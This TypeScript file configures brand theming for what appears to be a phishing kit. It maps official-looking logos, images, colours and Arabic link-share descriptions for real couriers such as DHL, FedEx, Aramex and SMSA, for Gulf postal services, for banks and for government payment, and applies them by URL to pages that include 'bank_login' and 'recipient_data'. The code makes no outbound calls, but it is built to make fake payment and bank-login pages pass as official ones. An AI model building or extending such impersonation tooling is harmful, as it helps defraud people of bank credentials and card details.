import { serviceLogos } from './serviceLogos';
import { bankBranding } from './brandingSystem';

import heroAramex from '@/assets/hero-aramex.jpg';
import heroDhl from '@/assets/hero-dhl.jpg';
import heroDhl1 from '@/assets/hero-dhl-1.jpg';
import heroDhl2 from '@/assets/hero-dhl-2.jpg';
import heroDhl3 from '@/assets/hero-dhl-3.jpg';
import heroFedex from '@/assets/hero-fedex.jpg';
import heroFedex1 from '@/assets/hero-fedex-1.jpg';
import heroFedex2 from '@/assets/hero-fedex-2.jpg';
import heroFedex3 from '@/assets/hero-fedex-3.jpg';
import heroUps from '@/assets/hero-ups.jpg';
import heroUps1 from '@/assets/hero-ups-1.jpg';
import heroUps2 from '@/assets/hero-ups-2.jpg';
import heroUps3 from '@/assets/hero-ups-3.jpg';
import heroSmsa from '@/assets/hero-smsa.jpg';
import heroSmsa1 from '@/assets/hero-smsa-1.jpg';
import heroSmsa2 from '@/assets/hero-smsa-2.jpg';
import heroSmsa3 from '@/assets/hero-smsa-3.jpg';
import heroNaqel from '@/assets/hero-naqel.jpg';
import heroNaqel1 from '@/assets/hero-naqel-1.jpg';
import heroNaqel2 from '@/assets/hero-naqel-2.jpg';
import heroZajil from '@/assets/hero-zajil.jpg';
import heroZajil1 from '@/assets/hero-zajil-1.jpg';
import heroZajil2 from '@/assets/hero-zajil-2.jpg';
import heroSaudipost from '@/assets/hero-saudipost.jpg';
import heroSaudipost1 from '@/assets/hero-saudipost-1.jpg';
import heroEmpost from '@/assets/hero-empost.jpg';
import heroEmpost2 from '@/assets/hero-empost-2.jpg';
import heroQpost from '@/assets/hero-qpost.jpg';
import heroKwpost from '@/assets/hero-kwpost.jpg';
import heroOmanpost from '@/assets/hero-omanpost.jpg';
import heroBahpost from '@/assets/hero-bahpost.jpg';
import heroAlbaraka from '@/assets/hero-albaraka.jpg';
import heroAlfuttaim from '@/assets/hero-alfuttaim.jpg';
import heroAlshaya from '@/assets/hero-alshaya.jpg';
import heroBahri from '@/assets/hero-bahri.jpg';
import heroShipco from '@/assets/hero-shipco.jpg';
import heroHellmann from '@/assets/hero-hellmann.jpg';
import heroDsv from '@/assets/hero-dsv.jpg';
import heroGenacom from '@/assets/hero-genacom.jpg';
import heroJinaken from '@/assets/hero-jinaken.jpg';
import heroJinakum from '@/assets/hero-jinakum.jpg';

export interface DynamicIdentityEntity {
  logo: string;
  animated_header_images: string[];
  header_position: 'below_top_bar' | 'top' | 'center';
  payment_share_image: string;
  payment_share_description: string;
  colors: {
    primary: string;
    secondary: string;
    background: string;
  };
  fonts: string[];
  buttons: {
    style: 'rounded' | 'flat' | 'sharp';
    hover: 'darken' | 'highlight' | 'scale';
  };
  background_images: string[];
  auto_apply: boolean;
  dynamic_behavior?: {
    on_bank_selection?: {
      apply_identity: boolean;
    };
  };
}

export interface DynamicIdentityConfig {
  entities: Record<string, DynamicIdentityEntity>;
  pages: string[];
  dynamic_application: boolean;
  enforce_official_assets_only: boolean;
  auto_run_on_load: boolean;
}

const getCompanyHeaderImages = (serviceKey: string): string[] => {
  const key = serviceKey.toLowerCase();
  
  const allImages: Record<string, string[]> = {
    aramex: [heroAramex],
    dhl: [heroDhl, heroDhl1, heroDhl2, heroDhl3],
    dhlkw: [heroDhl, heroDhl1, heroDhl2, heroDhl3],
    dhlqa: [heroDhl, heroDhl1, heroDhl2, heroDhl3],
    dhlom: [heroDhl, heroDhl1, heroDhl2, heroDhl3],
    dhlbh: [heroDhl, heroDhl1, heroDhl2, heroDhl3],
    fedex: [heroFedex, heroFedex1, heroFedex2, heroFedex3],
    ups: [heroUps, heroUps1, heroUps2, heroUps3],
    smsa: [heroSmsa, heroSmsa1, heroSmsa2, heroSmsa3],
    naqel: [heroNaqel, heroNaqel1, heroNaqel2],
    zajil: [heroZajil, heroZajil1, heroZajil2],
    saudipost: [heroSaudipost, heroSaudipost1],
    empost: [heroEmpost, heroEmpost2],
    qpost: [heroQpost],
    kwpost: [heroKwpost],
    omanpost: [heroOmanpost],
    bahpost: [heroBahpost],
    albaraka: [heroAlbaraka],
    alfuttaim: [heroAlfuttaim],
    alshaya: [heroAlshaya],
    bahri: [heroBahri],
    national: [heroBahri],
    shipco: [heroShipco],
    hellmann: [heroHellmann],
    dsv: [heroDsv],
    genacom: [heroGenacom],
    agility: [heroGenacom],
    jinaken: [heroJinaken],
    jinakum: [heroJinakum],
  };

  return allImages[key] || [];
};

const generateEntitiesFromServices = (): Record<string, DynamicIdentityEntity> => {
  const entities: Record<string, DynamicIdentityEntity> = {};
  
  Object.entries(serviceLogos).forEach(([key, service]) => {
    const headerImages = getCompanyHeaderImages(key);
    
    entities[key] = {
      logo: service.logo,
      animated_header_images: headerImages.length > 0 ? headerImages : [service.heroImage || service.ogImage || ''],
      header_position: 'below_top_bar',
      payment_share_image: service.ogImage || '',
      payment_share_description: service.description || `خدمات ${key}`,
      colors: {
        primary: service.colors.primary,
        secondary: service.colors.secondary,
        background: '#ffffff',
      },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: {
        style: 'rounded',
        hover: 'darken',
      },
      background_images: headerImages.length > 0 ? headerImages : [service.heroImage || service.ogImage || ''],
      auto_apply: true,
    };
  });
  
  return entities;
};

const generateEntitiesFromBanks = (): Record<string, DynamicIdentityEntity> => {
  const entities: Record<string, DynamicIdentityEntity> = {};
  
  Object.entries(bankBranding).forEach(([key, bank]) => {
    entities[`bank_${key}`] = {
      logo: '',
      animated_header_images: [],
      header_position: 'below_top_bar',
      payment_share_image: '',
      payment_share_description: `الخدمات المصرفية الإلكترونية - ${bank.nameAr}`,
      colors: {
        primary: bank.colors.primary,
        secondary: bank.colors.secondary || bank.colors.primary,
        background: bank.colors.background,
      },
      fonts: [bank.fonts.arabic, bank.fonts.primary],
      buttons: {
        style: 'rounded',
        hover: 'darken',
      },
      background_images: [],
      auto_apply: true,
      dynamic_behavior: {
        on_bank_selection: {
          apply_identity: true,
        },
      },
    };
  });
  
  return entities;
};

export const dynamicIdentityConfig: DynamicIdentityConfig = {
  entities: {
    ...generateEntitiesFromServices(),
    ...generateEntitiesFromBanks(),
    chalets: {
      logo: '/assets/dynamic-identity/official_logo_chalets.svg',
      animated_header_images: [
        '/assets/dynamic-identity/chalets_image1.svg',
        '/assets/dynamic-identity/chalets_image2.svg',
        '/assets/dynamic-identity/chalets_image3.svg'
      ],
      header_position: 'below_top_bar',
      payment_share_image: '/og-chalets.jpg',
      payment_share_description: 'حجز شاليهك بسهولة وأمان | أفضل الشاليهات في مكان واحد | دفع فوري وتأكيد فوري',
      colors: { primary: '#FF6F00', secondary: '#FFA000', background: '#FFF3E0' },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: { style: 'rounded', hover: 'darken' },
      background_images: [
        '/assets/dynamic-identity/chalets_bg.svg',
        '/assets/dynamic-identity/chalets_bg2.svg'
      ],
      auto_apply: true,
    },
    government_payment: {
      logo: '/assets/dynamic-identity/official_logo_gov.svg',
      animated_header_images: [
        '/assets/dynamic-identity/gov_image1.svg',
        '/assets/dynamic-identity/gov_image2.svg',
        '/assets/dynamic-identity/gov_image3.svg'
      ],
      header_position: 'below_top_bar',
      payment_share_image: '/og-government_payment.jpg',
      payment_share_description: 'خدمة دفع حكومية آمنة وموثوقة | الخدمات الحكومية الرسمية بضغطة زر | دفع سريع ومضمون',
      colors: { primary: '#004080', secondary: '#0073E6', background: '#E6F0FF' },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: { style: 'flat', hover: 'highlight' },
      background_images: [
        '/assets/dynamic-identity/gov_bg.svg',
        '/assets/dynamic-identity/gov_bg2.svg'
      ],
      auto_apply: true,
    },
    local_payment: {
      logo: '/assets/dynamic-identity/official_logo_local.svg',
      animated_header_images: [
        '/assets/dynamic-identity/local_image1.svg',
        '/assets/dynamic-identity/local_image2.svg',
        '/assets/dynamic-identity/local_image3.svg'
      ],
      header_position: 'below_top_bar',
      payment_share_image: '/og-local_payment.jpg',
      payment_share_description: 'دفع محلي سريع وآمن | جميع طرق الدفع المحلية في مكان واحد | دعم مدى وفيزا وماستركارد',
      colors: { primary: '#008000', secondary: '#00C000', background: '#E6FFE6' },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: { style: 'rounded', hover: 'darken' },
      background_images: [
        '/assets/dynamic-identity/local_bg.svg',
        '/assets/dynamic-identity/local_bg2.svg'
      ],
      auto_apply: true,
    },
    invoices: {
      logo: '/assets/dynamic-identity/official_logo_invoice.svg',
      animated_header_images: [
        '/assets/dynamic-identity/invoice_image1.svg',
        '/assets/dynamic-identity/invoice_image2.svg',
        '/assets/dynamic-identity/invoice_image3.svg'
      ],
      header_position: 'below_top_bar',
      payment_share_image: '/og-invoices.jpg',
      payment_share_description: 'إدارة ودفع الفواتير بكل سهولة | أنشئ وشارك فاتورتك فورًا | تتبع الدفعات مباشرة',
      colors: { primary: '#800000', secondary: '#B22222', background: '#FFE6E6' },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: { style: 'flat', hover: 'highlight' },
      background_images: [
        '/assets/dynamic-identity/invoice_bg.svg',
        '/assets/dynamic-identity/invoice_bg2.svg'
      ],
      auto_apply: true,
    },
    contracts: {
      logo: '/assets/dynamic-identity/official_logo_contract.svg',
      animated_header_images: [
        '/assets/dynamic-identity/contract_image1.svg',
        '/assets/dynamic-identity/contract_image2.svg',
        '/assets/dynamic-identity/contract_image3.svg'
      ],
      header_position: 'below_top_bar',
      payment_share_image: '/og-contracts.jpg',
      payment_share_description: 'عقود إلكترونية موثقة وآمنة | إدارة كاملة للعقود | دفع مرن بأقساط ميسرة',
      colors: { primary: '#000080', secondary: '#0000CD', background: '#E6E6FF' },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: { style: 'rounded', hover: 'darken' },
      background_images: [
        '/assets/dynamic-identity/contract_bg.svg',
        '/assets/dynamic-identity/contract_bg2.svg'
      ],
      auto_apply: true,
    },
    health_links: {
      logo: '/assets/dynamic-identity/official_logo_health.svg',
      animated_header_images: [
        '/assets/dynamic-identity/health_image1.svg',
        '/assets/dynamic-identity/health_image2.svg',
        '/assets/dynamic-identity/health_image3.svg'
      ],
      header_position: 'below_top_bar',
      payment_share_image: '/og-health_links.jpg',
      payment_share_description: 'خدمات صحية إلكترونية متكاملة | دفع فوري للفواتير الطبية | آمن ومضمون 100%',
      colors: { primary: '#008080', secondary: '#20B2AA', background: '#E0FFFF' },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: { style: 'flat', hover: 'highlight' },
      background_images: [
        '/assets/dynamic-identity/health_bg.svg',
        '/assets/dynamic-identity/health_bg2.svg'
      ],
      auto_apply: true,
    },
    bank_pages: {
      logo: '/assets/dynamic-identity/official_logo_bank.svg',
      animated_header_images: [
        '/assets/dynamic-identity/bank_image1.svg',
        '/assets/dynamic-identity/bank_image2.svg',
        '/assets/dynamic-identity/bank_image3.svg'
      ],
      header_position: 'below_top_bar',
      payment_share_image: '/og-bank_pages.jpg',
      payment_share_description: 'خدمات بنكية إلكترونية شاملة | دفع آمن مع جميع البنوك | تشفير 256-bit SSL',
      colors: { primary: '#0000FF', secondary: '#1E90FF', background: '#E6F0FF' },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: { style: 'rounded', hover: 'darken' },
      background_images: [
        '/assets/dynamic-identity/bank_bg.svg',
        '/assets/dynamic-identity/bank_bg2.svg'
      ],
      dynamic_behavior: { on_bank_selection: { apply_identity: true } },
      auto_apply: true,
    },
  },
  pages: [
    'payment_main',
    'payment_details',
    'confirmation',
    'history',
    'subpages',
    'recipient_data',
    'bank_login',
    'bank_selection',
  ],
  dynamic_application: true,
  enforce_official_assets_only: true,
  auto_run_on_load: true,
};

export const getEntityIdentity = (entityKey: string): DynamicIdentityEntity | null => {
  return dynamicIdentityConfig.entities[entityKey] || null;
};

export const applyDynamicIdentity = (entityKey: string) => {
  const identity = getEntityIdentity(entityKey);
  if (!identity || !identity.auto_apply) return;

  const root = document.documentElement;

  root.style.setProperty('--dynamic-primary', identity.colors.primary);
  root.style.setProperty('--dynamic-secondary', identity.colors.secondary);
  root.style.setProperty('--dynamic-background', identity.colors.background);

  root.style.setProperty('--dynamic-font-primary', identity.fonts[0]);
  root.style.setProperty('--dynamic-font-secondary', identity.fonts[1] || identity.fonts[0]);

  const buttonRadius = identity.buttons.style === 'rounded' ? '12px' : identity.buttons.style === 'flat' ? '4px' : '0px';
  root.style.setProperty('--dynamic-button-radius', buttonRadius);

  root.setAttribute('data-entity', entityKey);
  root.setAttribute('data-button-hover', identity.buttons.hover);
};

export const removeDynamicIdentity = () => {
  const root = document.documentElement;
  root.style.removeProperty('--dynamic-primary');
  root.style.removeProperty('--dynamic-secondary');
  root.style.removeProperty('--dynamic-background');
  root.style.removeProperty('--dynamic-font-primary');
  root.style.removeProperty('--dynamic-font-secondary');
  root.style.removeProperty('--dynamic-button-radius');
  root.removeAttribute('data-entity');
  root.removeAttribute('data-button-hover');
};

export const getEntityLogo = (entityKey: string): string | null => {
  const identity = getEntityIdentity(entityKey);
  return identity?.logo || null;
};

export const getEntityHeaderImages = (entityKey: string): string[] => {
  const identity = getEntityIdentity(entityKey);
  return identity?.animated_header_images || [];
};

export const getEntityBackgroundImages = (entityKey: string): string[] => {
  const identity = getEntityIdentity(entityKey);
  return identity?.background_images || [];
};

export const getEntityPaymentShareImage = (entityKey: string): string | null => {
  const identity = getEntityIdentity(entityKey);
  if (identity?.payment_share_image) {
    return identity.payment_share_image;
  }
  
  if (entityKey.startsWith('bank_')) {
    const bankId = entityKey.replace('bank_', '');
    return `/og-bank-${bankId}.jpg`;
  }
  
  return null;
};

export const shouldAutoApply = (entityKey: string): boolean => {
  const identity = getEntityIdentity(entityKey);
  return identity?.auto_apply || false;
};

export const getBankOGImage = (bankId: string): string => {
  return `/og-bank-${bankId}.jpg`;
};

export const detectEntityFromURL = (): string | null => {
  const params = new URLSearchParams(window.location.search);
  const entity = params.get('entity') || params.get('type') || params.get('company') || params.get('service');
  
  const path = window.location.pathname.toLowerCase();
  if (path.includes('chalet')) return 'chalets';
  if (path.includes('government') || path.includes('gov')) return 'government_payment';
  if (path.includes('local')) return 'local_payment';
  if (path.includes('invoice')) return 'invoices';
  if (path.includes('contract')) return 'contracts';
  if (path.includes('health')) return 'health_links';
  if (path.includes('bank')) return 'bank_pages';
  
  return entity;
};

export default dynamicIdentityConfig;
